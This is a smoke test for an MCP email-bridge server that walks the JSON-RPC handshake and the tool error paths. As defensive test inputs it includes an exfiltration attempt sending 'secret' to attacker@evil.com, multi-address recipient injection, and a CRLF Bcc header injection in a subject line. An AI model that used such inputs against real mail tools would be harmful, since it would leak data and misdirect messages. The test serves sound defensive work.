// stdio smoke test: really spawns the MCP server process and walks the JSON-RPC
// handshake plus tool-call error paths.
// No real mailbox needed: whitelist rejection is pure local logic; IMAP/SMTP point
// at 127.0.0.1:1 to fail fast.
// Run: node test/smoke.mjs

import { spawn } from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const serverJs = path.join(root, 'src', 'index.js');

const ENV = {
  ...process.env,
  EMAIL_BRIDGE_USER: 'bridge@test.example',
  EMAIL_BRIDGE_PASS: 'dummy',
  EMAIL_BRIDGE_IMAP_HOST: '127.0.0.1',
  EMAIL_BRIDGE_IMAP_PORT: '1',
  EMAIL_BRIDGE_SMTP_HOST: '127.0.0.1',
  EMAIL_BRIDGE_SMTP_PORT: '1',
  EMAIL_BRIDGE_ALLOWED_TO: 'owner@test.example,peer@test.example',
  EMAIL_BRIDGE_ALLOWED_FROM: 'owner@test.example',
  EMAIL_BRIDGE_STATE_DIR: '/tmp/email-bridge-smoke/state',
  EMAIL_BRIDGE_LOG_DIR: '/tmp/email-bridge-smoke/log',
};

let nextId = 1;
const proc = spawn(process.execPath, [serverJs], {
  env: ENV,
  stdio: ['pipe', 'pipe', 'pipe'],
});

let stdoutBuf = '';
const pending = new Map();
proc.stdout.on('data', (chunk) => {
  stdoutBuf += chunk.toString();
  for (;;) {
    const nl = stdoutBuf.indexOf('\n');
    if (nl < 0) break;
    const line = stdoutBuf.slice(0, nl);
    stdoutBuf = stdoutBuf.slice(nl + 1);
    if (!line.trim()) continue;
    let msg;
    try {
      msg = JSON.parse(line);
    } catch {
      fail(`non-JSON-RPC content on stdout (protocol channel polluted): ${line.slice(0, 120)}`);
      return;
    }
    const p = pending.get(msg.id);
    if (p) {
      pending.delete(msg.id);
      p(msg);
    }
  }
});

let stderrBuf = '';
proc.stderr.on('data', (c) => (stderrBuf += c.toString()));

let failed = false;
function fail(msg) {
  failed = true;
  console.error(`FAIL: ${msg}`);
  console.error(`stderr: ${stderrBuf.slice(0, 2000)}`);
  proc.kill('SIGKILL');
  process.exit(1);
}

function request(method, params, timeoutMs = 60000) {
  const id = nextId++;
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error(`${method} timed out (${timeoutMs}ms)`)), timeoutMs);
    pending.set(id, (msg) => {
      clearTimeout(timer);
      resolve(msg);
    });
    proc.stdin.write(JSON.stringify({ jsonrpc: '2.0', id, method, params }) + '\n');
  });
}

const results = [];
function check(name, cond, detail = '') {
  results.push({ name, ok: !!cond, detail });
  console.log(`${cond ? 'ok' : 'FAIL'} - ${name}${detail ? ` (${detail})` : ''}`);
}

// ---- 1. initialize handshake ----
let msg;
try {
  msg = await request('initialize', {
    protocolVersion: '2024-11-05',
    capabilities: {},
    clientInfo: { name: 'smoke', version: '0.0.0' },
  });
} catch (e) {
  fail(`initialize failed: ${e.message}`);
}
check('initialize returns serverInfo', msg?.result?.serverInfo?.name === 'email-bridge', JSON.stringify(msg?.result?.serverInfo));

proc.stdin.write(JSON.stringify({ jsonrpc: '2.0', method: 'notifications/initialized' }) + '\n');

// ---- 2. tools/list ----
try {
  msg = await request('tools/list', {});
} catch (e) {
  fail(`tools/list failed: ${e.message}`);
}
const names = (msg?.result?.tools ?? []).map((t) => t.name).sort();
check('tool list = check_inbox, list_threads, send_email', JSON.stringify(names) === JSON.stringify(['check_inbox', 'list_threads', 'send_email']), names.join(','));

const call = (name, args) => request('tools/call', { name, arguments: args });

// ---- 3. outbound whitelist rejection (pure local logic, no network) ----
msg = await call('send_email', { subject: 'exfil', body: 'secret', to: 'attacker@evil.com' });
check('non-whitelisted recipient is refused', msg?.result?.isError === true && /not on the outbound whitelist/.test(msg?.result?.content?.[0]?.text ?? ''), (msg?.result?.content?.[0]?.text ?? '').slice(0, 80));

// ---- 4. display-name disguise / multi-address injection refused ----
msg = await call('send_email', { subject: 'x', body: 'y', to: 'Owner <owner@test.example>' });
check('display-name recipient is refused', msg?.result?.isError === true && /not a valid single mailbox address/.test(msg?.result?.content?.[0]?.text ?? ''));

msg = await call('send_email', { subject: 'x', body: 'y', to: 'owner@test.example,attacker@evil.com' });
check('multi-address recipient is refused', msg?.result?.isError === true && /not a valid single mailbox address/.test(msg?.result?.content?.[0]?.text ?? ''));

// ---- 5. CRLF subject injection: must not make nodemailer throw a header error (sanitize then send normally) ----
// No real network here (SMTP 127.0.0.1:1); we only verify it fails at the
// connection stage, not the parameter stage
msg = await call('send_email', { subject: 'hi\r\nBcc: victim@x.com', body: 'y', to: 'owner@test.example' });
check('CRLF subject passes sanitization into the send path (fails on connection, not parameters)', msg?.result?.isError === true && /SMTP send failed/.test(msg?.result?.content?.[0]?.text ?? ''), (msg?.result?.content?.[0]?.text ?? '').slice(0, 60));

// ---- 6. IMAP connection failure → clear error text, process does not crash ----
msg = await call('check_inbox', { wait_seconds: 0 });
check('check_inbox returns a clear error on connection failure', msg?.result?.isError === true && /IMAP connection failed/.test(msg?.result?.content?.[0]?.text ?? ''));

msg = await call('list_threads', {});
check('list_threads returns a clear error on connection failure', msg?.result?.isError === true && /IMAP connection failed/.test(msg?.result?.content?.[0]?.text ?? ''));

// ---- 7. invalid arguments blocked by zod ----
msg = await call('check_inbox', { wait_seconds: 999 });
check('wait_seconds>120 is refused', msg?.result?.isError === true);
msg = await call('send_email', { subject: '' });
check('missing body is refused', msg?.result?.isError === true);
msg = await call('no_such_tool', {});
check('unknown tool is refused', msg?.result?.isError === true && /Unknown tool/.test(msg?.result?.content?.[0]?.text ?? ''));

// ---- 8. process still alive after consecutive calls (errors are not fatal) ----
check('server process still alive', proc.exitCode === null && !failed);

proc.kill('SIGTERM');
await new Promise((r) => setTimeout(r, 500));

// ---- 9. missing config → exits immediately with code 1 ----
// cwd points at a temp dir: isolates the real .env so this case truly tests "missing config"
const p2 = spawn(process.execPath, [serverJs], {
  cwd: os.tmpdir(),
  env: { ...process.env, EMAIL_BRIDGE_USER: '', EMAIL_BRIDGE_PASS: '' },
  stdio: ['ignore', 'ignore', 'pipe'],
});
const exit = await new Promise((r) => p2.once('exit', (code) => r(code)));
check('missing config fails at startup (exit=1)', exit === 1);

console.log(`\n${results.every((r) => r.ok) ? 'SMOKE PASS' : 'SMOKE FAIL'}: ${results.filter((r) => r.ok).length}/${results.length}`);
process.exit(results.every((r) => r.ok) ? 0 : 1);
